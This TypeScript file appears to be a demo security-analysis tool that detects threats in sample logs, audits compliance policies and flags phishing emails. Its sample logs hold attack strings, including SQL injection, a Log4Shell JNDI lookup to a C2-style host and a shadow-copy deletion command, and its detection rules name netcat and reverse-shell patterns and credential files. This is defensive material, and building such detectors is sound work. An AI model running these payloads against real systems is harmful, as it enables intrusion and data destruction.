// CyberSentinel AI Security Diagnostics and GRC Analysis Engine

export interface SecurityEvent {
  id: string;
  timestamp: string;
  sourceIp: string;
  destIp: string;
  protocol: 'TCP' | 'UDP' | 'HTTP' | 'SSH' | 'DNS' | 'ICMP';
  severity: 'low' | 'medium' | 'high' | 'critical';
  signature: string;
  mitreTechnique?: string;
  complianceFailure?: string;
  status: 'active' | 'mitigated' | 'suppressed';
}

export interface LogAnalysisResult {
  detectedThreat: string;
  confidence: number;
  severity: 'low' | 'medium' | 'high' | 'critical';
  mitreCode: string;
  mitreName: string;
  mitreDescription: string;
  grcControls: {
    nist: string;
    soc2: string;
    iso27001: string;
    gdpr?: string;
  };
  analysisSummary: string;
  impact: string;
  incidentResponsePlaybook: string[];
  remediationSnippet?: string;
}

export interface PolicyAuditResult {
  framework: string;
  overallScore: number; // 0-100
  status: 'Compliant' | 'Partial' | 'Non-Compliant';
  gaps: {
    controlId: string;
    title: string;
    description: string;
    severity: 'high' | 'medium' | 'low';
    finding: string;
    suggestedWording: string;
  }[];
  summary: string;
}

// Sample templates of raw logs for recruiters to test
export const LOG_SAMPLES = [
  {
    name: 'SQL Injection Attack',
    type: 'web_server',
    text: `192.168.1.142 - - [01/Jul/2026:09:42:01 +0000] "GET /api/users/profile?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users%20--%20HTTP/1.1" 200 4821 "http://vulnerable-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.142 - - [01/Jul/2026:09:42:03 +0000] "GET /api/users/profile?id=1%27%20AND%201%3D1%20UNION%20SELECT%20null,table_name,column_name%20FROM%20information_schema.columns%20--%20HTTP/1.1" 200 12543 "http://vulnerable-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`
  },
  {
    name: 'SSH Brute Force',
    type: 'auth_log',
    text: `Jul 01 09:43:10 edge-fw sshd[12042]: Invalid user admin from 185.220.101.4 port 54312 ssh2
Jul 01 09:43:12 edge-fw sshd[12044]: Invalid user admin from 185.220.101.4 port 54345 ssh2
Jul 01 09:43:14 edge-fw sshd[12048]: Invalid user root from 185.220.101.4 port 54388 ssh2
Jul 01 09:43:17 edge-fw sshd[12052]: Failed password for invalid user admin from 185.220.101.4 port 54312 ssh2
Jul 01 09:43:19 edge-fw sshd[12056]: Failed password for root from 185.220.101.4 port 54402 ssh2
Jul 01 09:43:21 edge-fw sshd[12060]: Failed password for root from 185.220.101.4 port 54410 ssh2`
  },
  {
    name: 'Log4Shell Exploitation',
    type: 'java_app_log',
    text: `2026-07-01 09:45:00,102 [http-nio-8080-exec-4] WARN  org.apache.logging.log4j - Request processing failed: Header User-Agent: \${jndi:ldap://malicious-c2-server.ru:1389/a}
2026-07-01 09:45:01,894 [http-nio-8080-exec-4] INFO  org.apache.naming.NamingContext - Executing remote JNDI reference lookup from malicious-c2-server.ru`
  },
  {
    name: 'Ransomware File Encryption',
    type: 'sysmon_log',
    text: `ProcessId: 4892
Image: C:\\Users\\Public\\Update.exe
CommandLine: "C:\\Users\\Public\\Update.exe" /s /v
TargetFilename: D:\\CompanyData\\Finances\\Invoice_2026.xlsx.locked
TargetFilename: D:\\CompanyData\\HR\\Employees.csv.locked
TargetFilename: D:\\CompanyData\\Legal\\Contracts.pdf.locked
ProcessId: 1042, Image: vssadmin.exe, CommandLine: "vssadmin.exe Delete Shadows /All /Quiet"`
  }
];

// Sample Compliance Policies for Recruiters to audit
export const POLICY_SAMPLES = [
  {
    name: 'Weak Access Control Policy',
    framework: 'SOC 2',
    text: `ACCESS CONTROL POLICY:
1. Employees are assigned standard passwords. Passwords should be changed at least once a year.
2. Administrators can log into the server environment directly from their home computers.
3. Access rights are reviewed by managers whenever they think it is necessary.
4. Passwords should ideally be 8 characters long.`
  },
  {
    name: 'Vague Backup & Disaster Recovery Policy',
    framework: 'ISO 27001',
    text: `BACKUP POLICY:
1. Backups are performed regularly by the IT administrator onto an external hard drive stored in the main office.
2. In the event of a disaster, we will attempt to restore servers using these backups as soon as possible.
3. The IT administrator checks if the backups are working occasionally.`
  },
  {
    name: 'Basic HR & Security Awareness Policy',
    framework: 'HIPAA',
    text: `SECURITY TRAINING & HR POLICY:
1. All staff members are told to keep patient records safe.
2. New staff members are briefed on privacy guidelines during their first week of work.
3. We terminate system access when someone leaves the organization.`
  }
];

// Local analysis parser (Rule-based security diagnostics engine)
export function analyzeLogLocal(logText: string): LogAnalysisResult {
  let normalized = logText.toLowerCase();
  try {
    normalized = decodeURIComponent(normalized);
  } catch (e) {
    // ignore malformed URI
  }
  // Strip common obfuscation patterns like /**/ for SQLi detection
  const deobfuscated = normalized.replace(/\/\*\*\//g, '');

  if (deobfuscated.includes('union') && deobfuscated.includes('select') && (deobfuscated.includes('users') || deobfuscated.includes('columns') || deobfuscated.includes('--'))) {
    return {
      detectedThreat: 'SQL Injection (SQLi) Attempt',
      confidence: 96,
      severity: 'high',
      mitreCode: 'T1190',
      mitreName: 'Exploit Public-Facing Application',
      mitreDescription: 'Adversaries may attempt to exploit vulnerabilities in website endpoints to query backend databases and extract unauthorized data.',
      grcControls: {
        nist: 'PR.DS-5 (Data Protection), DE.CM-4 (Security Monitoring)',
        soc2: 'CC6.1 (Access Control Controls), CC7.1 (Vulnerability Management)',
        iso27001: 'A.8.24 (Use of Cryptography), A.8.28 (Secure Coding)',
        gdpr: 'Article 32 (Security of Processing)'
      },
      analysisSummary: 'Detected SQL UNION operator injection targeting database schema retrieval. The attacker is trying to bypass application parameters to directly query database tables, aiming to exfiltrate usernames and password hashes.',
      impact: 'High risk of complete database compromise, administrative credential theft, and compliance violation under GDPR (data breach exposing user records).',
      incidentResponsePlaybook: [
        'Containment: Block source IP address 192.168.1.142 immediately at the WAF level.',
        'Investigation: Inspect web server logs to verify if the server returned HTTP 200 with sensitive payload lengths or if the request crashed the database.',
        'Remediation: Refactor application database query code to use Parameterized Queries / Prepared Statements. Disable database error reporting to clients.'
      ],
      remediationSnippet: `// VULNERABLE CODE:
// db.query("SELECT * FROM users WHERE id = '" + req.query.id + "'");

// SECURED REMEDIATION:
db.query("SELECT * FROM users WHERE id = ?", [req.query.id], (err, results) => { ... });`
    };
  }

  if (normalized.includes('sshd') && (normalized.includes('failed password') || normalized.includes('invalid user'))) {
    return {
      detectedThreat: 'SSH Brute Force Attack',
      confidence: 98,
      severity: 'medium',
      mitreCode: 'T1110.001',
      mitreName: 'Brute Force: Password Guessing',
      mitreDescription: 'Adversaries may attempt to gain access to system user accounts by continuously trying common passwords or automated lists of credential pairs.',
      grcControls: {
        nist: 'PR.AC-1 (Access Control/Credentials), DE.AE-1 (Anomaly Auditing)',
        soc2: 'CC6.2 (User Credentials Management), CC6.3 (Access Grant/Revocation)',
        iso27001: 'A.9.2.1 (User registration and de-registration), A.9.4.3 (Password management system)'
      },
      analysisSummary: 'Detected multiple rapid, failed SSH authentication attempts from IP 185.220.101.4 targeting default usernames (admin, root). This indicates automated dictionary-based brute forcing.',
      impact: 'Potential system compromise and unauthorized remote administrative control if default or weak passwords are used.',
      incidentResponsePlaybook: [
        'Containment: Add 185.220.101.4 to system firewall rules (iptables/ufw drop) or activate Fail2ban blocking.',
        'Hardening: Disable SSH password authentication in /etc/ssh/sshd_config (set PasswordAuthentication no) and enforce SSH Key authentication.',
        'Audit: Review system security logs to confirm whether any login from that IP succeeded.'
      ],
      remediationSnippet: `# Secure SSH Server Configuration (/etc/ssh/sshd_config)
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3`
    };
  }

  if (normalized.includes('jndi:ldap') || normalized.includes('log4j') || normalized.includes('namingcontext')) {
    return {
      detectedThreat: 'Log4Shell Exploitation Attempt (CVE-2021-44228)',
      confidence: 99,
      severity: 'critical',
      mitreCode: 'T1210',
      mitreName: 'Exploitation of Remote Services',
      mitreDescription: 'Adversaries may exploit Log4j JNDI lookup functionality to force systems to retrieve and run remote, malicious Java payloads.',
      grcControls: {
        nist: 'PR.IP-12 (Vulnerability Management), DE.CM-1 (Network Monitoring)',
        soc2: 'CC7.1 (System Vulnerability Monitoring), CC7.3 (Incident Containment)',
        iso27001: 'A.12.6.1 (Management of technical vulnerabilities)'
      },
      analysisSummary: 'Detected remote JNDI Java naming lookup payload (\${jndi:ldap://...}) in client headers. The log indicates an attempt to exploit the log4j vulnerability to trigger remote code execution (RCE).',
      impact: 'Critical risk of full remote control over the Java Application server, server shell access, and lateral movement in the host network.',
      incidentResponsePlaybook: [
        'Containment: Isolate the affected application container from the network. Block egress traffic to malicious-c2-server.ru.',
        'Mitigation: Run the Java process with -Dlog4j2.formatMsgNoLookups=true system parameter, or upgrade Apache Log4j dependencies immediately to v2.17.1+.',
        'Investigation: Check process tables and outgoing TCP connections to identify if a remote shell was established.'
      ],
      remediationSnippet: `# Set environment variable / system flag to disable lookups:
LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# Or upgrade Gradle/Maven dependencies to v2.17.1+`
    };
  }

  if (normalized.includes('locked') && (normalized.includes('update.exe') || normalized.includes('vssadmin'))) {
    return {
      detectedThreat: 'Ransomware Deployment & Shadow Copy Deletion',
      confidence: 95,
      severity: 'critical',
      mitreCode: 'T1486',
      mitreName: 'Data Encrypted for Impact',
      mitreDescription: 'Adversaries may encrypt data on target systems or delete local shadow storage copies to disrupt system availability and demand ransom payments.',
      grcControls: {
        nist: 'PR.IP-4 (Backups), RC.RP-1 (Incident Recovery Planning)',
        soc2: 'CC7.3 (Response and Containment), CC8.1 (System Recovery & Backups)',
        iso27001: 'A.12.3.1 (Information Backup), A.17.1.1 (Information security continuity)'
      },
      analysisSummary: 'Detected execution of vssadmin.exe deleting volume shadow copies, coupled with rapid modification/addition of file extension ".locked" to corporate data directories. This matches ransomware execution behaviors.',
      impact: 'Total loss of critical corporate files, business operation stoppage, and massive legal liability due to data breach of intellectual property/PII.',
      incidentResponsePlaybook: [
        'Containment: Immediately isolate the host from the local area network (disconnect WiFi and Ethernet) to block worm-like propagation.',
        'Eradication: Kill the active malicious process Update.exe (PID 4892) and purge the execution binaries.',
        'Recovery: Verify integrity of off-site, air-gapped backups and begin restoring data. Do NOT pay ransom.'
      ],
      remediationSnippet: `# PowerShell Command to identify and block unauthorized process executions:
Stop-Process -Id 4892 -Force
Set-Service -Name "VolumeShadowCopy" -StartupType Automatic`
    };
  }

  // 1. Directory Traversal (LFI)
  if (normalized.includes('../') || normalized.includes('..%2f') || normalized.includes('/etc/shadow') || normalized.includes('/etc/passwd')) {
    return {
      detectedThreat: 'Path Traversal (Local File Inclusion)',
      confidence: 97,
      severity: 'high',
      mitreCode: 'T1190',
      mitreName: 'Exploit Public-Facing Application',
      mitreDescription: 'Adversaries may exploit path traversal vulnerabilities to access files and directories stored outside the web root folder.',
      grcControls: {
        nist: 'PR.DS-5 (Data Protection)',
        soc2: 'CC6.6 (Logical Access Security)',
        iso27001: 'A.14.2.1 (Secure development policy)'
      },
      analysisSummary: 'Detected a Path Traversal attempt ("../" sequences) targeting sensitive OS configuration files. The attacker is attempting to break out of the web directory to read local system files.',
      impact: 'High risk of exposing system credentials, private keys, or configuration data, leading to full server compromise.',
      incidentResponsePlaybook: [
        'Containment: Block the source IP address immediately.',
        'Investigation: Check web server logs to see if the server returned HTTP 200 with a large payload size, which indicates the file was successfully read.',
        'Remediation: Implement strict input validation on file path parameters and run the application with least privilege (chroot jail).'
      ],
      remediationSnippet: `// Node.js Express Secure Path Validation:
const safePath = path.join(__dirname, 'public', path.basename(req.query.file));
if (!safePath.startsWith(path.join(__dirname, 'public'))) {
    return res.status(403).send('Forbidden');
}`
    };
  }

  // 2. Cross-Site Scripting (XSS)
  if (normalized.includes('<script>') || normalized.includes('%3cscript%3e') || normalized.includes('document.cookie')) {
    return {
      detectedThreat: 'Cross-Site Scripting (XSS)',
      confidence: 95,
      severity: 'medium',
      mitreCode: 'T1189',
      mitreName: 'Drive-by Compromise',
      mitreDescription: 'Adversaries may inject malicious scripts into web pages viewed by other users to steal session tokens or credentials.',
      grcControls: {
        nist: 'PR.PT-4 (Communications and Control Networks)',
        soc2: 'CC7.1 (Vulnerability Management)',
        iso27001: 'A.14.2.8 (System security testing)'
      },
      analysisSummary: 'Detected an injected JavaScript payload containing script tags or cookie extraction methods. The attacker aims to execute code in the browsers of legitimate users.',
      impact: 'Medium risk of session hijacking, account takeover, and unauthorized actions performed on behalf of the victim.',
      incidentResponsePlaybook: [
        'Containment: Deploy WAF rules to block cross-site scripting signatures.',
        'Investigation: Determine if the XSS payload was stored in the database (Stored XSS) or reflected in the URL.',
        'Remediation: Enforce strict HTML sanitization and Content Security Policy (CSP) headers.'
      ],
      remediationSnippet: `// Secure Headers Middleware (Helmet):
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "trusted-cdn.com"]
  }
}));`
    };
  }

  // 3. OS Command Injection
  if (normalized.includes('cat /etc/') || normalized.includes('; cat') || normalized.includes('| nc ') || normalized.includes('bash -i')) {
    return {
      detectedThreat: 'OS Command Injection',
      confidence: 98,
      severity: 'critical',
      mitreCode: 'T1059',
      mitreName: 'Command and Scripting Interpreter',
      mitreDescription: 'Adversaries may abuse command interpreters to execute arbitrary operating system commands.',
      grcControls: {
        nist: 'PR.PT-3 (Principle of Least Privilege)',
        soc2: 'CC6.8 (Unauthorized Software Execution)',
        iso27001: 'A.12.5.1 (Installation of software on operational systems)'
      },
      analysisSummary: 'Detected shell metacharacters (; or |) followed by native OS commands (cat, nc). The attacker is attempting to execute arbitrary code directly on the host operating system.',
      impact: 'Critical risk of immediate remote code execution (RCE) and total server takeover.',
      incidentResponsePlaybook: [
        'Containment: Isolate the server from the network to prevent reverse shell persistence.',
        'Eradication: Terminate unauthorized background processes and reverse shells.',
        'Remediation: Replace insecure system/exec calls with secure language-specific APIs that do not invoke a shell.'
      ],
      remediationSnippet: `// VULNERABLE:
// exec(\`ping -c 4 \${req.body.ip}\`);

// SECURE (No Shell Spawned):
const { spawn } = require('child_process');
spawn('ping', ['-c', '4', req.body.ip]);`
    };
  }

  // Fallback heuristic for custom pasted logs
  return {
    detectedThreat: 'Unrecognized Activity (Heuristic Engine Failed)',
    confidence: 10,
    severity: 'low',
    mitreCode: 'Unknown',
    mitreName: 'Uncategorized',
    mitreDescription: 'The current heuristic engine ruleset cannot identify this activity.',
    grcControls: {
      nist: 'DE.AE-2 (Analyze Events)',
      soc2: 'CC7.2 (Security Event Monitoring)',
      iso27001: 'A.16.1.2 (Reporting security events)'
    },
    analysisSummary: 'HONEST DISCLOSURE: Our simple rule-based heuristic engine completely failed to identify this attack. Because this engine relies on strictly hardcoded keyword matches, it cannot detect complex, obfuscated, or unexpected attacks (like Blind SQLi). This is a fundamental limitation of traditional heuristic systems.',
    impact: 'Unknown. Without a true AI model to understand the contextual intent of the payload, we cannot accurately assess the impact of this log.',
    incidentResponsePlaybook: [
      'Manual Review: A human security analyst must manually parse and interpret this raw log.',
      'System Upgrade: Consider migrating from a rule-based SIEM to an LLM-powered diagnostic pipeline to catch zero-day variations.'
    ],
    remediationSnippet: `// The heuristic engine failed because it lacks rules for this payload.
// You cannot write an if/else statement for every possible attack mutation.`
  };
}

// Local GRC Policy Auditor Gap Analysis Engine
export function auditPolicyLocal(policyText: string, framework: string): PolicyAuditResult {
  const norm = policyText.toLowerCase();
  const gaps: PolicyAuditResult['gaps'] = [];
  let score = 100;

  if (framework === 'SOC 2') {
    // Check Multi-Factor Authentication
    if (!norm.includes('mfa') && !norm.includes('multi-factor') && !norm.includes('two-factor') && !norm.includes('2fa')) {
      score -= 25;
      gaps.push({
        controlId: 'CC6.1',
        title: 'Logical Access Controls (MFA Enforcement)',
        description: 'Requires authentication mechanisms to protect production infrastructure using secondary validation layers.',
        severity: 'high',
        finding: 'The policy permits direct access without specifying Multi-Factor Authentication (MFA) requirements for staff or system administrators.',
        suggestedWording: 'Multi-factor authentication (MFA) must be enforced for all employees and system administrators accessing the company production network, cloud services, and email suites.'
      });
    }

    // Check Password Complexity
    const passwordLengthMatch = norm.match(/(\d+)\s*character/);
    const length = passwordLengthMatch ? parseInt(passwordLengthMatch[1]) : 0;
    
    if (length === 0) {
      score -= 20;
      gaps.push({
        controlId: 'CC6.2',
        title: 'User Registration & Credential Integrity (Length)',
        description: 'Requires establishing robust password parameters (length, complexity, rotation) to mitigate credential guessing.',
        severity: 'high',
        finding: 'No specific password length parameter is defined in the access control text.',
        suggestedWording: 'Passwords must contain a minimum of 12 characters.'
      });
    } else if (length < 12) {
      // Dynamic score penalty depending on how short the password is
      const penalty = Math.max(5, 30 - length * 2);
      score -= penalty;
      gaps.push({
        controlId: 'CC6.2',
        title: 'User Registration & Credential Integrity (Length)',
        description: 'Requires establishing robust password parameters (length, complexity, rotation) to mitigate credential guessing.',
        severity: 'medium',
        finding: `Password length requirement is set to ${length} characters, which is below the compliance standard of 12+ characters.`,
        suggestedWording: 'Passwords must contain a minimum of 12 characters.'
      });
    }

    if (!norm.includes('complexity') && !norm.includes('complex') && !norm.includes('special') && !norm.includes('symbol') && !norm.includes('uppercase')) {
      score -= 15;
      gaps.push({
        controlId: 'CC6.2',
        title: 'User Registration & Credential Integrity (Complexity)',
        description: 'Requires passwords to contain complex characters to block dictionary scans.',
        severity: 'medium',
        finding: 'No password complexity requirements (e.g. symbols, numbers, uppercase letters) are specified.',
        suggestedWording: 'Passwords must include at least one uppercase letter, one lowercase letter, one number, and one special character.'
      });
    }

    // Check Access Reviews
    if (!norm.includes('quarter') && !norm.includes('annual') && !norm.includes('review') || norm.includes('whenever they think')) {
      score -= 15;
      gaps.push({
        controlId: 'CC6.3',
        title: 'Access Review Audits',
        description: 'Requires periodic authorization reviews to maintain the principle of least privilege.',
        severity: 'medium',
        finding: 'Access reviews are loosely scheduled ("whenever managers think it is necessary") which fails the audit standard for structural periodic review.',
        suggestedWording: 'User access privileges to production databases and code repositories must be formally reviewed by authorized management on a quarterly basis to enforce the principle of least privilege.'
      });
    }

    // Check Encryption
    if (!norm.includes('encrypt') && !norm.includes('ssl') && !norm.includes('tls')) {
      score -= 20;
      gaps.push({
        controlId: 'CC6.6',
        title: 'Transmission Security (Encryption)',
        description: 'Requires encryption of data during transmission over public networks.',
        severity: 'high',
        finding: 'No mention of database or transmission encryption standards for internal and external network requests.',
        suggestedWording: 'All communications carrying sensitive or customer data over external networks must be encrypted using TLS 1.3 or higher. All persistent production database disks must be encrypted at rest.'
      });
    }
  }

  else if (framework === 'ISO 27001') {
    // Check Off-site Backups
    if (norm.includes('external hard drive') && norm.includes('office') && !norm.includes('cloud') && !norm.includes('off-site')) {
      score -= 30;
      gaps.push({
        controlId: 'A.12.3.1',
        title: 'Information Backup Security',
        description: 'Requires backups to be taken, regularly tested, and stored securely off-site in an isolated location.',
        severity: 'high',
        finding: 'Backups are stored locally on a physical drive in the office, creating a single point of failure (fire, physical theft, flooding).',
        suggestedWording: 'System backups must be encrypted, replicated automatically, and stored in a secure, off-site cloud environment or secondary geolocated facility isolated from the primary local network.'
      });
    }

    // Check Backup Testing
    if (!norm.includes('test') && !norm.includes('verify') || norm.includes('occasionally')) {
      score -= 20;
      gaps.push({
        controlId: 'A.12.3.1',
        title: 'Backup Restoration Testing',
        description: 'Requires backup restoration capabilities to be tested at scheduled intervals.',
        severity: 'medium',
        finding: 'Backup testing is undefined or described as "occasional" rather than scheduled and documented.',
        suggestedWording: 'Backups must undergo simulated restoration testing at least semi-annually. Test outcomes and recovery time indicators (RTO/RPO) must be logged and reviewed.'
      });
    }

    // Check Incident Procedures
    if (!norm.includes('incident') || norm.includes('attempt to restore')) {
      score -= 25;
      gaps.push({
        controlId: 'A.16.1',
        title: 'Security Incident Procedures',
        description: 'Requires operational procedures to ensure quick and structured response to security incidents.',
        severity: 'high',
        finding: 'No formalized incident escalation or response path exists beyond "attempting to restore servers as soon as possible".',
        suggestedWording: 'A formal Incident Response Plan (IRP) must be maintained, detailing escalation paths, communications checklists, and regulatory reporting steps. Cyber incidents must be reported to the security officer within 2 hours.'
      });
    }
  }

  else if (framework === 'HIPAA') {
    // Check PHI access
    if (!norm.includes('patient') && !norm.includes('phi') && !norm.includes('health')) {
      score -= 15;
      gaps.push({
        controlId: '164.308(a)(1)',
        title: 'PHI Data Identification',
        description: 'Requires explicit security procedures governing electronic Protected Health Information (ePHI).',
        severity: 'medium',
        finding: 'The policy text lacks explicit reference to Protected Health Information (PHI) definition and storage parameters.',
        suggestedWording: 'All systems handling Electronic Protected Health Information (ePHI) must maintain audit logging and be restricted strictly to credentialed health workers on a need-to-know basis.'
      });
    }

    // Check Security Awareness Training
    if (!norm.includes('training') && !norm.includes('awareness') || norm.includes('briefed')) {
      score -= 30;
      gaps.push({
        controlId: '164.308(a)(5)',
        title: 'Security Awareness Training',
        description: 'Requires security awareness and training programs for all members of the workforce.',
        severity: 'high',
        finding: 'HR security onboarding is brief and informal ("briefed on guidelines"). No systematic training is established.',
        suggestedWording: 'All workforce members, including contractors, must complete compliance-certified HIPAA Privacy and Security Awareness training annually, with completion records logged by HR.'
      });
    }

    // Check Off-boarding Accounts
    if (!norm.includes('immediately') && !norm.includes('24 hours') && norm.includes('leaves')) {
      score -= 25;
      gaps.push({
        controlId: '164.308(a)(4)',
        title: 'Termination Procedures',
        description: 'Enforces procedures for terminating access to PHI when employment ends.',
        severity: 'high',
        finding: 'Lack of timeline constraint on disabling system accounts for departing staff, which can lead to orphan account compromises.',
        suggestedWording: 'System access and authentication tokens for terminated employees must be revoked immediately upon departure, and no later than 24 hours from official termination.'
      });
    }
  }

  else if (framework === 'GDPR') {
    // Check Data Retention & Deletion
    if (!norm.includes('delete') && !norm.includes('retention') && !norm.includes('right to be forgotten')) {
      score -= 30;
      gaps.push({
        controlId: 'Article 17',
        title: 'Right to Erasure (Forgotten)',
        description: 'Requires systems to be able to delete personal data of EU citizens upon request without undue delay.',
        severity: 'high',
        finding: 'The policy does not address data subject rights, particularly the Right to Erasure or structured data retention periods.',
        suggestedWording: 'Processes must be implemented to fulfill customer requests for data erasure under GDPR Article 17 within 30 days, ensuring deletion cascades across backups and downstream systems.'
      });
    }

    // Check Breach Notification
    if (!norm.includes('72') && !norm.includes('breach')) {
      score -= 30;
      gaps.push({
        controlId: 'Article 33',
        title: 'Notification of Personal Data Breach',
        description: 'Requires notifying supervisory authorities of data breaches within 72 hours of identification.',
        severity: 'high',
        finding: 'No policy provision specifies the mandatory 72-hour window for reporting data breaches to data protection authorities.',
        suggestedWording: 'In the event of a personal data breach, the Data Protection Officer (DPO) must evaluate risk and, if required, notify the relevant Supervisory Authority within 72 hours of becoming aware of the breach.'
      });
    }
  }

  // Set default score floor
  score = Math.max(score, 10);
  const status = score > 85 ? 'Compliant' : score > 50 ? 'Partial' : 'Non-Compliant';
  const summary = score > 85 
    ? 'This policy is robust and covers key regulatory parameters.'
    : `The policy has notable compliance gaps under the ${framework} framework. Review the details below and apply the suggested edits.`;

  return {
    framework,
    overallScore: score,
    status,
    gaps,
    summary
  };
}

// Client-side Phishing Analyzer Heuristic
export interface PhishingAnalysisResult {
  riskScore: number;
  verdict: 'Safe' | 'Suspicious' | 'Malicious';
  threats: {
    category: string;
    description: string;
    snippet: string;
  }[];
}

export function analyzePhishingLocal(emailText: string): PhishingAnalysisResult {
  const norm = emailText.toLowerCase();
  const threats: PhishingAnalysisResult['threats'] = [];
  let score = 0;

  // Check urgency keywords
  const urgencyKeywords = ['urgent', 'immediate action', 'suspended', 'unauthorized login', 'verify account', 'security warning', 'wire transfer', 'payroll update', 'overdue invoice'];
  urgencyKeywords.forEach(kw => {
    if (norm.includes(kw)) {
      score += 15;
      threats.push({
        category: 'Urgency & Scare Tactics',
        description: `Uses high-stress triggers ("${kw}") to bypass logical security verification checks.`,
        snippet: emailText.substring(Math.max(0, norm.indexOf(kw) - 20), Math.min(emailText.length, norm.indexOf(kw) + kw.length + 30))
      });
    }
  });

  // Check suspect domains or subdomains
  const domainMismatch = norm.match(/@([a-z0-9.-]+)/gi);
  if (domainMismatch) {
    const suspectDomains = ['secure-bank', 'login-verify', 'update-cpanel', 'netflix-billing', 'support-desk', 'paypal-safety'];
    suspectDomains.forEach(sd => {
      if (norm.includes(sd)) {
        score += 30;
        threats.push({
          category: 'Spoofed/Lookalike Domain',
          description: `Uses a suspicious or lookalike domain "${sd}" designed to mimic authentic organizations.`,
          snippet: emailText.substring(Math.max(0, norm.indexOf(sd) - 15), Math.min(emailText.length, norm.indexOf(sd) + sd.length + 15))
        });
      }
    });
  }

  // Check suspect link formats
  if (norm.includes('click here') || norm.includes('login to your account') || norm.includes('update your details')) {
    score += 20;
    threats.push({
      category: 'Generic Call to Action (CTA)',
      description: 'Contains generic hyperlink instructions designed to redirect the victim to credential harvesting landing pages.',
      snippet: 'Hyperlink CTA detected (e.g. "click here" or login requests)'
    });
  }

  // Check financial/wiring flags
  if (norm.includes('bank transfer') || norm.includes('swift') || norm.includes('routing number') || norm.includes('crypto')) {
    score += 15;
    threats.push({
      category: 'Financial Request Trigger',
      description: 'Identifies banking routing, wiring, or crypto commands typical of Business Email Compromise (BEC).',
      snippet: 'Request involving account wires, invoices, or bank transfers.'
    });
  }

  score = Math.min(score, 100);
  const verdict = score > 60 ? 'Malicious' : score > 20 ? 'Suspicious' : 'Safe';

  return {
    riskScore: score,
    verdict,
    threats
  };
}

// Optional Live API calling utility (Gemini API format)
export async function analyzeWithGemini(apiKey: string, promptText: string, taskType: 'log' | 'policy' | 'phish'): Promise<string> {
  const systemInstructions = {
    log: "You are an expert SOC Analyst. Analyze this raw log. Output: 1. Detected Threat, 2. Severity (low/medium/high/critical), 3. MITRE ATT&CK Mapping, 4. NIST CSF & SOC 2 controls impacted, 5. Concise Incident Response Playbook steps, 6. Remediation code/configuration changes.",
    policy: "You are a GRC Auditor. Audit this security policy against the specified framework. Output: 1. Overall Compliance Score (0-100), 2. Detailed Gaps list referencing framework controls (SOC 2, ISO 27001, etc.), 3. Specific compliance-ready replacement text to patch each gap.",
    phish: "You are a Phishing Forensics Specialist. Analyze this email body or header. Identify Phishing indicators, risk score (0-100), and specific red flags (domain spoofing, urgency, link targets)."
  };

  try {
    const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        contents: [
          {
            role: 'user',
            parts: [{ text: `${systemInstructions[taskType]}\n\nInput text to analyze:\n${promptText}` }]
          }
        ]
      })
    });

    if (!response.ok) {
      throw new Error(`API returned status ${response.status}`);
    }

    const data = await response.json();
    return data.candidates?.[0]?.content?.parts?.[0]?.text || "No response received from Gemini.";
  } catch (error: any) {
    throw new Error(`Gemini API Error: ${error.message}`);
  }
}
